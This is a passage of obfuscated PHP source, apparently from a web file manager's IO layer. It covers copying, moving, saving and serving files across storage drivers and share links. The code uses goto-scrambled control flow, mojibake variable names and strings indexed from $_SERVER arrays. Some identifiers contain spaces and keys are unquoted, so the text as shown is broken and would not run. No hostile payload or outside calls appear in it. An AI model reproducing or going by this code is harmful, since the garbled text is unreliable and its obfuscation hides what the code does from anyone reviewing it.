$EÆ³èª¼ºÍ); } goto a¯›¸Ï½‘Æ; CµÅõÆ¾’„: return $A·ØºŠÎÃ; goto f´´‰µÚ›‚; fØÓ ŒÖë»: $eÙáˆäÔçÕ = Action($FÏ®—¬Š¼[19])->accessToken(); $cĞ×ßê“Â‘ = str_replace($FÏ®—¬Š¼[5], $FÏ®—¬Š¼[4], $cĞ×ßê“Â‘) . $FÏ®—¬Š¼[20] . $eÙáˆäÔçÕ . $a¬é™Ë˜ÑÖ; $fïÛ’çßÑ— = $FÏ®—¬Š¼[16]; goto fëŠ‹¤‡‘Í; f´´‰µÚ›‚: } function ActionCallHook($eÈİŠ•‹­¡) { goto C”ï¦á§µñ; Aç¢Ã¶“¾È: $GLOBALS[$c¿—ãŒ×„‘[31]] = 1; $f¶‰Úæ®‰İ = ActionApply($eÈİŠ•‹­¡, $cÅŠóùÚ‰Œ); $aó–¿‡”Éª = ob_get_clean(); goto C³·Ÿ”ê·; C”ï¦á§µñ: $c¿—ãŒ×„‘ =& $_SERVER[ñâ]; ob_start(); $cÅŠóùÚ‰Œ = array_slice(func_get_args(), 1); goto Aç¢Ã¶“¾È; C³·Ÿ”ê·: $f¶‰Úæ®‰İ = $aó–¿‡”Éª ? json_decode($aó–¿‡”Éª, !0) : $f¶‰Úæ®‰İ; $GLOBALS[$c¿—ãŒ×„‘[31]] = 0; return $f¶‰Úæ®‰İ; goto b«Á¶ŞŸ’; b«Á¶ŞŸ’: } goto A··Ó«‚¼É; E–‡ìãÊ“ª: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($eÜ›ŒèÃ«±, $fŒ–…ƒ¾ÄÂ) { $B£éİå¸¿‡ = self::driverMake($fŒ–…ƒ¾ÄÂ[0]); if (method_exists($B£éİå¸¿‡, $eÜ›ŒèÃ«±)) { return @call_user_func_array(array($B£éİå¸¿‡, $eÜ›ŒèÃ«±), $fŒ–…ƒ¾ÄÂ); } if (method_exists($B£éİå¸¿‡, $_SERVER[í™][983])) { return @call_user_func_array(array($B£éİå¸¿‡, $eÜ›ŒèÃ«±), $fŒ–…ƒ¾ÄÂ); } else { if (method_exists(self, $eÜ›ŒèÃ«±)) { return @call_user_func_array(array(self, $eÜ›ŒèÃ«±), $fŒ–…ƒ¾ÄÂ); } else { call_user_func_array(array(parent, $eÜ›ŒèÃ«±), $fŒ–…ƒ¾ÄÂ); } } } public static function init($Eñ¯«†» Ç) { return self::driverMake($Eñ¯«†» Ç); } public static function copy($Bª¿î˜Ò¨, $AÄâ¨­ˆ±, $a‡ó •·‚ = false, $Bœóğ©Á¯È = false) { return self::copyMove($Bª¿î˜Ò¨, $AÄâ¨­ˆ±, $a‡ó •·‚, $_SERVER[í™][492], $Bœóğ©Á¯È); } public static function move($DŸ·—›òÄ¹, $AÍÅ¨ÛÜ·¢, $b™ôçÖÄ„ƒ = false, $D·ù˜†É”ä = false) { return self::copyMove($DŸ·—›òÄ¹, $AÍÅ¨ÛÜ·¢, $b™ôçÖÄ„ƒ, $_SERVER[í™][494], $D·ù˜†É”ä); } public static function saveFile($bàÔÙÒ•ƒ, $f¾é‹µ²Øİ, $B¬¶í«ªˆ“ = true) { goto f¾–Ùµ¢Š˜; c£Ôöõßİ¾: $bÛÆœÈÅ› = self::copyFile($fàšÁ¶»ˆ­, $bàÔÙÒ•ƒ, $Cç©İŠ’Ìñ, $cÇë•Ûš÷´, $C˜©ê£Šç[$B¦ˆÏÙÔŠ[28]], $A¬ŒŠ‚Ù•à); if ($D Â¤Ö‰İ¸) { $bÛÆœÈÅ› = $D Â¤Ö‰İ¸->getPathOuter($bÛÆœÈÅ›); } return $bÛÆœÈÅ›; goto dÒ”éÒÖõÎ; D„ÂâÒÚà: $Cç©İŠ’Ìñ = self::driverMake($f¾é‹µ²Øİ); $D Â¤Ö‰İ¸ = !1; if ($Cç©İŠ’Ìñ->pathParse[$B¦ˆÏÙÔŠ[984]]) { $cÙÙâ¢ŠÓ = $Cç©İŠ’Ìñ->pathParse[$B¦ˆÏÙÔŠ[984]]; $D Â¤Ö‰İ¸ = $Cç©İŠ’Ìñ; $Cç©İŠ’Ìñ = self::driverMake($cÙÙâ¢ŠÓ); } goto B‡‡½òğ‰‚; B‡‡½òğ‰‚: $cÇë•Ûš÷´ = $Cç©İŠ’Ìñ->pathFather($f¾é‹µ²Øİ); $A¬ŒŠ‚Ù•à = !0; if (!$B¬¶í«ªˆ“ && self::driverIsSame($fàšÁ¶»ˆ­, $Cç©İŠ’Ìñ)) { $A¬ŒŠ‚Ù•à = !1; } goto c£Ôöõßİ¾; f¾–Ùµ¢Š˜: $B¦ˆÏÙÔŠ =& $_SERVER[í™]; $C˜©ê£Šç = self::info($f¾é‹µ²Øİ); $fàšÁ¶»ˆ­ = self::driverMake($bàÔÙÒ•ƒ); goto D„ÂâÒÚà; dÒ”éÒÖõÎ: } private static function copyMove($b ˆ—òÈÓ, $FóÁ½»—í, $C¨ØÀéŸ…, $Aõ­¦à‘Ì‘, $Cªï’‘ï‚  = false) { goto DÁ•Ö¸¼¶Œ; A„—ëÇŞÜå: $d—Í°²Ô†À = !1; if ($BÂÁèÍ¹¿->pathParse[$cŠëîÁ‚Øï[984]]) { $FóÁ½»—í = $BÂÁèÍ¹¿->pathParse[$cŠëîÁ‚Øï[984]]; $d—Í°²Ô†À = $BÂÁèÍ¹¿; $BÂÁèÍ¹¿ = self::driverMake($FóÁ½»—í); } self::check($F±ÊÌŠ›, $b ˆ—òÈÓ, $BÂÁèÍ¹¿, $FóÁ½»—í); goto Eö‘…ÑğŠ; f‡Óåô´İ²: if ($d—Í°²Ô†À) { $aÖùëÛÛƒÊ = $d—Í°²Ô†À->getPathOuter($aÖùëÛÛƒÊ); } return $aÖùëÛÛƒÊ; goto aå›Ä› À¢; Eö‘…ÑğŠ: Hook::trigger($cŠëîÁ‚Øï[72], $F±ÊÌŠ›, $b ˆ—òÈÓ, $BÂÁèÍ¹¿, $FóÁ½»—í); $BÍš·è„” = self::driverIsSame($F±ÊÌŠ›, $BÂÁèÍ¹¿); if ($BÍš·è„”) { if ($Aõ­¦à‘Ì‘ == $cŠëîÁ‚Øï[494] && !method_exists($BÂÁèÍ¹¿, $cŠëîÁ‚Øï[985]) && trim($FóÁ½»—í, $cŠëîÁ‚Øï[8]) == trim($BÂÁèÍ¹¿->pathFather($b ˆ—òÈÓ), $cŠëîÁ‚Øï[8])) { return $BÂÁèÍ¹¿->getPathOuter($b ˆ—òÈÓ); } if (method_exists($BÂÁèÍ¹¿, $Aõ­¦à‘Ì‘)) { return $BÂÁèÍ¹¿->{$Aõ­¦à‘Ì‘}($b ˆ—òÈÓ, $FóÁ½»—í, $C¨ØÀéŸ…); } } goto E¼îøãœéÖ; E¼îøãœéÖ: $c²ªˆç’­Û = $F±ÊÌŠ›->isFile($b ˆ—òÈÓ); if (!$c²ªˆç’­Û && $BÂÁèÍ¹¿->getType() == $cŠëîÁ‚Øï[676] && $F±ÊÌŠ›->getType() == $cŠëîÁ‚Øï[102]) { $aÖùëÛÛƒÊ = $BÂÁèÍ¹¿->copyFolderFromIO($F±ÊÌŠ›, $b ˆ—òÈÓ, $FóÁ½»—í, $C¨ØÀéŸ…, $DàÑ³˜¹Ë, $Cªï’‘ï‚ ); } else { $aÖùëÛÛƒÊ = self::copyPath($F±ÊÌŠ›, $b ˆ—òÈÓ, $BÂÁèÍ¹¿, $FóÁ½»—í, $C¨ØÀéŸ…, $DàÑ³˜¹Ë, $c²ªˆç’­Û, $Cªï’‘ï‚ ); } if ($aÖùëÛÛƒÊ && $DàÑ³˜¹Ë) { $F±ÊÌŠ›->remove($b ˆ—òÈÓ); } goto f‡Óåô´İ²; DÁ•Ö¸¼¶Œ: $cŠëîÁ‚Øï =& $_SERVER[í™]; if (!$b ˆ—òÈÓ || $b ˆ—òÈÓ == $cŠëîÁ‚Øï[8] || !$FóÁ½»—í) { return !1; } ignore_timeout(); goto aæ«¬¾“Ïì; aæ«¬¾“Ïì: $F±ÊÌŠ› = self::driverMake($b ˆ—òÈÓ); $BÂÁèÍ¹¿ = self::driverMake($FóÁ½»—í); $DàÑ³˜¹Ë = $Aõ­¦à‘Ì‘ == $cŠëîÁ‚Øï[494]; goto A„—ëÇŞÜå; aå›Ä› À¢: } private static function check($FÊƒ’–ÈÜÃ, $E‹˜Ë¡—Ğ„, $aàò¬Ü“Ÿ, &$F–‚¢ÒŠä‰) { $Céø“ÔÃ“ñ =& $_SERVER[í™]; if (self::driverIsSame($FÊƒ’–ÈÜÃ, $aàò¬Ü“Ÿ) && $FÊƒ’–ÈÜÃ->isFolder($E‹˜Ë¡—Ğ„) && $FÊƒ’–ÈÜÃ->isParentOf($E‹˜Ë¡—Ğ„, $F–‚¢ÒŠä‰)) { show_json(LNG($Céø“ÔÃ“ñ[986]), !1); } if (!$FÊƒ’–ÈÜÃ->exist($E‹˜Ë¡—Ğ„)) { show_json(LNG($Céø“ÔÃ“ñ[101]), !1); } } private static function copyPath($BîÂÚÕ–¤Ä, $dô¸°œğè, $Aã—²», $B„·“’¤ë, $cÙ“…ŸÔ, $eÎ‘øì˜ºË, $f›ç®¶‚‚‹, $A„Ãù¼¦”¡ = false) { goto D¡ëÏÃ§ª”; F…ÂÎÏÜÏ¹: if ($f›ç®¶‚‚‹) { return self::copyFile($BîÂÚÕ–¤Ä, $dô¸°œğè, $Aã—²», $B„·“’¤ë, $E Ñ©Ğ‘Ó, $eÎ‘øì˜ºË); } if ($cÙ“…ŸÔ == REPEAT_RENAME_FOLDER) { $cÙ“…ŸÔ = !1; } $F¼Ö«¬ù¾ = rtrim($B„·“’¤ë, $BŸ´Ãí„Ê[8]) . $BŸ´Ãí„Ê[8] . $E Ñ©Ğ‘Ó; goto EšªÉ¦ÎÓò; eš¨±”·„Í: $F•ìÀ†ùê¤ = array_merge($E½”Û¹˜÷[$BŸ´Ãí„Ê[73]], $E½”Û¹˜÷[$BŸ´Ãí„Ê[74]]); foreach ($F•ìÀ†ùê¤ as $A˜í„•ÏÊ‰) { $CõéµîçÒ¨ = $A˜í„•ÏÊ‰[$BŸ´Ãí„Ê[29]] == $BŸ´Ãí„Ê[167]; $dô¸°œğè = $BîÂÚÕ–¤Ä->getPathInner($A˜í„•ÏÊ‰[$BŸ´Ãí„Ê[75]]); $b—ì›šÓ¬ = self::copyPath($BîÂÚÕ–¤Ä, $dô¸°œğè, $Aã—²», $B„·“’¤ë, $cÙ“…ŸÔ, $eÎ‘øì˜ºË, $CõéµîçÒ¨); if (!$b—ì›šÓ¬) { write_log($BŸ´Ãí„Ê[987] . $dô¸°œğè . $BŸ´Ãí„Ê[988] . $B„·“’¤ë, $BŸ´Ãí„Ê[989]); } } return $eÆÊ´ø´Š; goto a†®……Åº; EšªÉ¦ÎÓò: $eÆÊ´ø´Š = $Aã—²»->mkdir($Aã—²»->getPath($F¼Ö«¬ù¾)); $B„·“’¤ë = $Aã—²»->getPathInner($eÆÊ´ø´Š); $E½”Û¹˜÷ = $BîÂÚÕ–¤Ä->listPath($dô¸°œğè, !0); goto eš¨±”·„Í; D¡ëÏÃ§ª”: $BŸ´Ãí„Ê =& $_SERVER[í™]; $E Ñ©Ğ‘Ó = $A„Ãù¼¦”¡ ? $A„Ãù¼¦”¡ : $BîÂÚÕ–¤Ä->getPathName($BîÂÚÕ–¤Ä->pathThis($dô¸°œğè)); if ($cÙ“…ŸÔ) { $f¹ˆ¨§áğ = $Aã—²»->fileNameExist($B„·“’¤ë, $E Ñ©Ğ‘Ó); $E Ñ©Ğ‘Ó = $Aã—²»->fileNameAuto($B„·“’¤ë, $E Ñ©Ğ‘Ó, $cÙ“…ŸÔ, !$f›ç®¶‚‚‹); $cÙ“…ŸÔ = $f¹ˆ¨§áğ ? $cÙ“…ŸÔ : !1; } goto F…ÂÎÏÜÏ¹; a†®……Åº: } private static function copyFile($b‘éÊÉ¹’, $Bíù‹ÎÁÓŸ, $c»„¯‹ê¥, $FìµôÜÊÂ“, $EÖÍ¤ÈªÚ, $aö¸½ÅàÓ¢) { goto d ¯·ö¶¨‡; d ¯·ö¶¨‡: $C™™ÊÊ²¸Í =& $_SERVER[í™]; $FìµôÜÊÂ“ = $c»„¯‹ê¥->getPath(rtrim($FìµôÜÊÂ“, $C™™ÊÊ²¸Í[8]) . $C™™ÊÊ²¸Í[8] . $EÖÍ¤ÈªÚ); $F‘Ãä•åĞ = $C™™ÊÊ²¸Í[990] . time() . rand_string(5); goto F”ïÁç¤¸®; aŒ›õ™‡¯»: mk_dir($BÅ·İê³‰õ); $C‰’£çÁÙÀ = $BÅ·İê³‰õ . $F‘Ãä•åĞ; $C‰’£çÁÙÀ = $b‘éÊÉ¹’->download($Bíù‹ÎÁÓŸ, $C‰’£çÁÙÀ); goto EŒ«Â±Äìá; EŒ«Â±Äìá: $C‰’£çÁÙÀ = $b‘éÊÉ¹’->iconvApp($C‰’£çÁÙÀ); $b…µŒ ¥¿¹ = $c»„¯‹ê¥->upload($FìµôÜÊÂ“, $C‰’£çÁÙÀ, $aö¸½ÅàÓ¢); self::remove($BÅ·İê³‰õ . $F‘Ãä•åĞ); goto BÛÓÙÆ’Íƒ; F”ïÁç¤¸®: Hook::trigger($C™™ÊÊ²¸Í[991], $b‘éÊÉ¹’, $Bíù‹ÎÁÓŸ, $c»„¯‹ê¥, $FìµôÜÊÂ“, $EÖÍ¤ÈªÚ, $F‘Ãä•åĞ); if (self::driverIsSame($b‘éÊÉ¹’, $c»„¯‹ê¥)) { if ($aö¸½ÅàÓ¢) { $b…µŒ ¥¿¹ = $c»„¯‹ê¥->moveFile($Bíù‹ÎÁÓŸ, $FìµôÜÊÂ“); } else { $b…µŒ ¥¿¹ = $c»„¯‹ê¥->copyFile($Bíù‹ÎÁÓŸ, $FìµôÜÊÂ“); } Hook::trigger($C™™ÊÊ²¸Í[992], $b‘éÊÉ¹’, $Bíù‹ÎÁÓŸ, $c»„¯‹ê¥, $FìµôÜÊÂ“, $EÖÍ¤ÈªÚ, $b…µŒ ¥¿¹); return $b…µŒ ¥¿¹; } $BÅ·İê³‰õ = TEMP_FILES; goto aŒ›õ™‡¯»; BÛÓÙÆ’Íƒ: Hook::trigger($C™™ÊÊ²¸Í[992], $b‘éÊÉ¹’, $Bíù‹ÎÁÓŸ, $c»„¯‹ê¥, $FìµôÜÊÂ“, $EÖÍ¤ÈªÚ, $b…µŒ ¥¿¹); return $b…µŒ ¥¿¹; goto eªÉÑ„Şãƒ; eªÉÑ„Şãƒ: } public static function pathFather($F‰…¨„˜) { $FË¼™ñíšã = IO::init($F‰…¨„˜); $fìî¨á“–ó = $FË¼™ñíšã->pathFather($FË¼™ñíšã->path); return $FË¼™ñíšã->getPathOuter($fìî¨á“–ó); } public static function fileOut($a£¶µ‹¤§Û, $FğÎôäëğè = false, $eÁâµŠª— = false, $C×ëÊĞåùÔ = '') { $fô¯–¢‰™ = self::driverMake($a£¶µ‹¤§Û); if ($fô¯–¢‰™->isFileOutServer()) { return $fô¯–¢‰™->fileOutServer($a£¶µ‹¤§Û, $FğÎôäëğè, $eÁâµŠª—, $C×ëÊĞåùÔ); } return $fô¯–¢‰™->fileOut($a£¶µ‹¤§Û, $FğÎôäëğè, $eÁâµŠª—, $C×ëÊĞåùÔ); } public static function fileOutImage($cÖù‚Ãï™Ë, $CùƒÙÎ½ƒ¡ = 250) { $dŒƒÊÀÀÙ« = array(250, 600, 1200, 3000); for ($Döã²†ê¢¤ = 0; $Döã²†ê¢¤ < count($dŒƒÊÀÀÙ«); $Döã²†ê¢¤++) { if ($Döã²†ê¢¤ == 0 && $CùƒÙÎ½ƒ¡ <= $dŒƒÊÀÀÙ«[$Döã²†ê¢¤]) { $CùƒÙÎ½ƒ¡ = $dŒƒÊÀÀÙ«[$Döã²†ê¢¤]; break; } else { if ($CùƒÙÎ½ƒ¡ > $dŒƒÊÀÀÙ«[$Döã²†ê¢¤ - 1] && $CùƒÙÎ½ƒ¡ <= $dŒƒÊÀÀÙ«[$Döã²†ê¢¤]) { $CùƒÙÎ½ƒ¡ = $dŒƒÊÀÀÙ«[$Döã²†ê¢¤]; break; } else { if ($Döã²†ê¢¤ == count($dŒƒÊÀÀÙ«) - 1 && $CùƒÙÎ½ƒ¡ > $dŒƒÊÀÀÙ«[$Döã²†ê¢¤]) { $CùƒÙÎ½ƒ¡ = $dŒƒÊÀÀÙ«[$Döã²†ê¢¤]; break; } } } } $BÒ¢”™±ø = self::driverMake($cÖù‚Ãï™Ë); if ($BÒ¢”™±ø->isFileOutServer()) { return $BÒ¢”™±ø->fileOutImageServer($cÖù‚Ãï™Ë, $CùƒÙÎ½ƒ¡); } return $BÒ¢”™±ø->fileOutImage($cÖù‚Ãï™Ë, $CùƒÙÎ½ƒ¡); } private static function driverIsSame($Fº¨ŸÑ¡ÌÏ, $d…¤òİÚÊ…) { goto BßÜó”‰Êœ; F­ó­¶š¾»: if ($Fº¨ŸÑ¡ÌÏ->pathDriver == $d…¤òİÚÊ…->pathDriver) { return !0; } return !1; goto eŒïéÇÍè„; A¥ÔÁ©ºÒ•: if ($eèïô‚ˆóˆ != $dôÒ•ƒÙ§) { return !1; } if ($eèïô‚ˆóˆ == $bó«¥šÅĞ¨[676]) { return !0; } if ($eèïô‚ˆóˆ == $bó«¥šÅĞ¨[102]) { return !0; } goto F­ó­¶š¾»; BßÜó”‰Êœ: $bó«¥šÅĞ¨ =& $_SERVER[í™]; $eèïô‚ˆóˆ = $Fº¨ŸÑ¡ÌÏ->getType(); $dôÒ•ƒÙ§ = $d…¤òİÚÊ…->getType(); goto A¥ÔÁ©ºÒ•; eŒïéÇÍè„: } public static function copyUpdate($bÜèÎ™ÛÎŠ, $DêŠä¶‡ Ã) { goto e£İ¹ö—®ê; Bº“›”Ç±«: $eÕŒ¾Å–æ = array(); foreach ($BÑá¬î÷Âˆ as $DÕìÕ¯¿•Â => $fì›«ö÷Ç¬) { if (isset($dí„ƒ¾Š·Œ[$DÕìÕ¯¿•Â])) { if ($fì›«ö÷Ç¬[$EÍÌì›±™ƒ[76]] == 1) { continue; } if ($dí„ƒ¾Š·Œ[$DÕìÕ¯¿•Â][$EÍÌì›±™ƒ[77]] == $fì›«ö÷Ç¬[$EÍÌì›±™ƒ[77]]) { continue; } } if ($fì›«ö÷Ç¬[$EÍÌì›±™ƒ[76]] == 1) { $eÕŒ¾Å–æ[] = $DêŠä¶‡ Ã . $EÍÌì›±™ƒ[8] . $DÕìÕ¯¿•Â; continue; } $FÂñÔ¿™„Ê = strstr(trim($DÕìÕ¯¿•Â, $EÍÌì›±™ƒ[8]), $EÍÌì›±™ƒ[8]) ? get_path_father($DÕìÕ¯¿•Â) : $EÍÌì›±™ƒ[33]; $e‚ğ££ó†ï[] = array($EÍÌì›±™ƒ[993] => $fì›«ö÷Ç¬[$EÍÌì›±™ƒ[75]], $EÍÌì›±™ƒ[994] => rtrim($DêŠä¶‡ Ã, $EÍÌì›±™ƒ[8]) . $EÍÌì›±™ƒ[8] . $FÂñÔ¿™„Ê, $EÍÌì›±™ƒ[995] => $fì›«ö÷Ç¬); } $Cˆ¬ùÜ¦° = array($EÍÌì›±™ƒ[167] => $e‚ğ££ó†ï, $EÍÌì›±™ƒ[76] => $eÕŒ¾Å–æ); goto eõ´Æ²ó¦†; D¦À‰øÆ÷ø: $BÑá¬î÷Âˆ = self::_listAll($bÜèÎ™ÛÎŠ); $dí„ƒ¾Š·Œ = self::_listAll($DêŠä¶‡ Ã); $e‚ğ££ó†ï = array(); goto Bº“›”Ç±«; eõ´Æ²ó¦†: Hook::trigger($EÍÌì›±™ƒ[996], $bÜèÎ™ÛÎŠ, $DêŠä¶‡ Ã, $Cˆ¬ùÜ¦°); foreach ($eÕŒ¾Å–æ as $fì›«ö÷Ç¬) { IO::mkdir($fì›«ö÷Ç¬); } foreach ($e‚ğ££ó†ï as $fì›«ö÷Ç¬) { IO::copy($fì›«ö÷Ç¬[$EÍÌì›±™ƒ[993]], $fì›«ö÷Ç¬[$EÍÌì›±™ƒ[994]], REPEAT_REPLACE); } goto E½Ü¦¯Åå¹; e£İ¹ö—®ê: $EÍÌì›±™ƒ =& $_SERVER[í™]; if (!IO::exist($bÜèÎ™ÛÎŠ)) { return !1; } if (!IO::exist($DêŠä¶‡ Ã)) { IO::mkdir($DêŠä¶‡ Ã); } goto D¦À‰øÆ÷ø; E½Ü¦¯Åå¹: } private static function _listAll($b”‡Ú¡šô©) { $cßÓ‘‡™Ûá =& $_SERVER[í™]; $b”‡Ú¡šô© = KodIO::clear($b”‡Ú¡šô©); $eª˜Õø¦õ = IO::listAll($b”‡Ú¡šô©); foreach ($eª˜Õø¦õ as &$E´Ê“­Ì¤²) { $e«Í¡¢™İ = substr($E´Ê“­Ì¤²[$cßÓ‘‡™Ûá[75]], strlen($b”‡Ú¡šô©)); $E´Ê“­Ì¤²[$cßÓ‘‡™Ûá[997]] = trim($e«Í¡¢™İ, $cßÓ‘‡™Ûá[8]); } return array_to_keyvalue($eª˜Õø¦õ, $cßÓ‘‡™Ûá[997]); } public static function fileSubstr($c•£³™À, $cËéáôİŠÌ, $fô«†‡’‚ = false) { goto e¨óå†±Ñø; e¨óå†±Ñø: $dÑƒ¨½îçË = self::driverMake($c•£³™À); $aÍÆŒòÙÒŞ = $dÑƒ¨½îçË->size($c•£³™À); $Eùß¾¬è† = $cËéáôİŠÌ; goto dí±Ç„˜ÚÂ; dí±Ç„˜ÚÂ: $aÙàøÖáèŞ = $fô«†‡’‚; if ($cËéáôİŠÌ < 0) { $cËéáôİŠÌ = $aÍÆŒòÙÒŞ + $cËéáôİŠÌ; } if ($fô«†‡’‚ === !1) { $fô«†‡’‚ = $aÍÆŒòÙÒŞ - $cËéáôİŠÌ; } goto B¤ªİ²öÖÓ; B¤ªİ²öÖÓ: if ($cËéáôİŠÌ + $fô«†‡’‚ > $aÍÆŒòÙÒŞ) { $fô«†‡’‚ = $aÍÆŒòÙÒŞ - $cËéáôİŠÌ; } if ($fô«†‡’‚ <= 0) { return $_SERVER[í™][33]; } if ($cËéáôİŠÌ < 0 || $cËéáôİŠÌ >= $aÍÆŒòÙÒŞ || $fô«†‡’‚ > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\x65\x52\x65\x61\144\x20\145\x72\x72\x6f\162\x21\40\x73\x74\141\x72\x74\x3d{$cËéáôİŠÌ}\73\154\145\156\147\164\150\75{$fô«†‡’‚}\73\x20\163\151\x7a\x65\x3d{$aÍÆŒòÙÒŞ}\73"); } goto E£æëËÕ¹Ş; E£æëËÕ¹Ş: return $dÑƒ¨½îçË->fileSubstr($c•£³™À, $cËéáôİŠÌ, $fô«†‡’‚); goto Eç˜í¡“; Eç˜í¡“: } private static function driverMake(&$DİÈ«Œƒã­) { goto bÁñì–İÃ—; A·£š„Àë§: return $dòéÏçå‹Î; goto dÓÍ«İºŒÑ; B¹äœºøÎÄ: if ($cĞ§â¾÷¸[$CÓõïî»İÓ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$cĞ§â¾÷¸[$CÓõïî»İÓ[367]]]) { return !1; } $DİÈ«Œƒã­ = $cĞ§â¾÷¸[$CÓõïî»İÓ[998]]; $dòéÏçå‹Î = self::driverGet($cĞ§â¾÷¸, $DİÈ«Œƒã­); goto A·£š„Àë§; bÁñì–İÃ—: $CÓõïî»İÓ =& $_SERVER[í™]; $cĞ§â¾÷¸ = KodIO::parse($DİÈ«Œƒã­); if (!self::$driverListSystem) { $bÇÙ÷“¹Ñ¯ = Model($CÓõïî»İÓ[685])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($bÇÙ÷“¹Ñ¯, $CÓõïî»İÓ[367]); } goto B¹äœºøÎÄ; dÓÍ«İºŒÑ: } private static function driverGet($aâƒŠƒ±âË, &$a‰ÀôÚîæè) { goto CèÉ•İæÏÑ; CèÉ•İæÏÑ: $C¬ÏÛ’ÚªÖ =& $_SERVER[í™]; $CøÅÇ°¨‰Ã = $aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[999]]; $E´Â¢«¤†— = $aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[367]]; goto a÷ñÀĞ²‡±; a÷ñÀĞ²‡±: switch ($aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[29]]) { case KodIO::KOD_IO: $câ¹ê‰ïŞ™ = self::$driverListSystem[$E´Â¢«¤†—]; break; case KodIO::KOD_SOURCE: $a‰ÀôÚîæè = $E´Â¢«¤†— . $a‰ÀôÚîæè; $câ¹ê‰ïŞ™ = array($C¬ÏÛ’ÚªÖ[1000] => $C¬ÏÛ’ÚªÖ[1001], $C¬ÏÛ’ÚªÖ[6] => $aâƒŠƒ±âË); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $AÂ’à÷ÌÂË = $GLOBALS[$C¬ÏÛ’ÚªÖ[1002]]; self::$driverListUser = array_to_keyvalue($AÂ’à÷ÌÂË, $C¬ÏÛ’ÚªÖ[367]); } $câ¹ê‰ïŞ™ = self::$driverListUser[$E´Â¢«¤†—]; break; case KodIO::KOD_SHARE_LINK: $câ¹ê‰ïŞ™ = array($C¬ÏÛ’ÚªÖ[1000] => $C¬ÏÛ’ÚªÖ[1003], $C¬ÏÛ’ÚªÖ[6] => $aâƒŠƒ±âË); $b»ö¸ÆÛÕ¯ = Action($C¬ÏÛ’ÚªÖ[1004])->sharePathInfo($aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[75]]); $a‰ÀôÚîæè = $b»ö¸ÆÛÕ¯[$C¬ÏÛ’ÚªÖ[369]]; if (!$b»ö¸ÆÛÕ¯[$C¬ÏÛ’ÚªÖ[369]]) { $cšÈ…ãØÃ¬ = Model($C¬ÏÛ’ÚªÖ[538])->getInfo($b»ö¸ÆÛÕ¯[$C¬ÏÛ’ÚªÖ[441]]); $a‰ÀôÚîæè = KodIO::clear($cšÈ…ãØÃ¬[$C¬ÏÛ’ÚªÖ[1005]] . $aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[998]]); $aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[439]] = $cšÈ…ãØÃ¬; $aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[984]] = $a‰ÀôÚîæè; $câ¹ê‰ïŞ™ = array($C¬ÏÛ’ÚªÖ[1000] => $C¬ÏÛ’ÚªÖ[1006], $C¬ÏÛ’ÚªÖ[6] => $aâƒŠƒ±âË); } break; case KodIO::KOD_SHARE_ITEM: $câ¹ê‰ïŞ™ = array($C¬ÏÛ’ÚªÖ[1000] => $C¬ÏÛ’ÚªÖ[1007], $C¬ÏÛ’ÚªÖ[6] => $aâƒŠƒ±âË); $cšÈ…ãØÃ¬ = Model($C¬ÏÛ’ÚªÖ[538])->getInfo($aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[367]]); if ($cšÈ…ãØÃ¬[$C¬ÏÛ’ÚªÖ[369]] == $C¬ÏÛ’ÚªÖ[470]) { $a‰ÀôÚîæè = KodIO::clear($cšÈ…ãØÃ¬[$C¬ÏÛ’ÚªÖ[1005]] . $aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[998]]); $aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[439]] = $cšÈ…ãØÃ¬; $aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[984]] = $a‰ÀôÚîæè; $câ¹ê‰ïŞ™ = array($C¬ÏÛ’ÚªÖ[1000] => $C¬ÏÛ’ÚªÖ[1008], $C¬ÏÛ’ÚªÖ[6] => $aâƒŠƒ±âË); } else { if (!$a‰ÀôÚîæè) { $a‰ÀôÚîæè = $cšÈ…ãØÃ¬[$C¬ÏÛ’ÚªÖ[369]]; } } break; default: $a‰ÀôÚîæè = $aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[75]]; $câ¹ê‰ïŞ™ = array($C¬ÏÛ’ÚªÖ[1000] => $C¬ÏÛ’ÚªÖ[1009]); break; } $dô¶¼¨‹¯ˆ = $aâƒŠƒ±âË[$C¬ÏÛ’ÚªÖ[75]]; if (!isset(self::$driverCache[$dô¶¼¨‹¯ˆ])) { $Dá›Îàİ‚ò = strtolower($câ¹ê‰ïŞ™[$C¬ÏÛ’ÚªÖ[90]]); $aÑ‡©‡´ğ = $GLOBALS[$C¬ÏÛ’ÚªÖ[6]][$C¬ÏÛ’ÚªÖ[84]][$C¬ÏÛ’ÚªÖ[735]]; $d¯êÛºñ²® = $C¬ÏÛ’ÚªÖ[71] . (isset($aÑ‡©‡´ğ[$Dá›Îàİ‚ò]) ? $aÑ‡©‡´ğ[$Dá›Îàİ‚ò] : ucfirst($Dá›Îàİ‚ò)); if (!class_exists($d¯êÛºñ²®)) { show_json("{$d¯êÛºñ²®}\40\x6e\x6f\x74\40\x65\x78\x69\163\x74\x73\x21", !1); } $CÌÙ‚ğò«¿ = isset($câ¹ê‰ïŞ™[$C¬ÏÛ’ÚªÖ[6]]) ? $câ¹ê‰ïŞ™[$C¬ÏÛ’ÚªÖ[6]] : !1; self::$driverCache[$dô¶¼¨‹¯ˆ] = new $d¯êÛºñ²®($CÌÙ‚ğò«¿); } goto A’î…¨¨»°; FÏ©ŠøãŠ¨: if (isset($câ¹ê‰ïŞ™[$C¬ÏÛ’ÚªÖ[6]][$C¬ÏÛ’ÚªÖ[1010]])) { $aÒ„Ëèó¥->pathBase = rtrim($câ¹ê‰ïŞ™[$C¬ÏÛ’ÚªÖ[6]][$C¬ÏÛ’ÚªÖ[1010]], $C¬ÏÛ’ÚªÖ[8]) . $C¬ÏÛ’ÚªÖ[8]; $a‰ÀôÚîæè = $aÒ„Ëèó¥->pathBase . ltrim($a‰ÀôÚîæè, 